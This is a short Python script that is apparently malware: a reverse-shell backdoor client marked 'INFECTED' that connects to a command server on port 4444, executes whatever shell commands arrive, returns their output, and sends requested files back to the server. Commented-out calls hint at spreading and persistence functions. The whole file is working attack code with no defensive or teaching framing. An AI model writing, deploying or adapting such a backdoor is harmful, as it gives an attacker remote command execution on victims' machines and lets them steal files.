#!/usr/bin/python3.8
import subprocess
import sys
import socket
from time import *
#from viral import *
#from registry import *


status = 'INFECTED'


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 4444
BUFFER_SIZE = 1024


def upload():
    file = sock.recv(BUFFER_SIZE).decode()
    f = open(file, 'rb')
    i = f.read(BUFFER_SIZE)
    while i:
        sock.send(i)
        i = f.read(BUFFER_SIZE)
    f.close()
    sock.send('Complete')


def connect():
    while True:
        try:
            print('Connecting to server...')
            sock.connect((SERVER_HOST, SERVER_PORT))
        except Exception as e:
            print(e)
            sleep(5)
            connect()
        else:
            print('Connection Successful')
            while True:
                received = sock.recv(BUFFER_SIZE).decode()
                if received == 'quit':
                    sock.close()
                    sys.exit()
                elif received == 'download':
                    upload()
                else:
                    result = subprocess.getoutput(received)
                    sock.send(result.encode())


if __name__ == '__main__':
    # spread()
    # virus_property()
    # regc()
    connect()
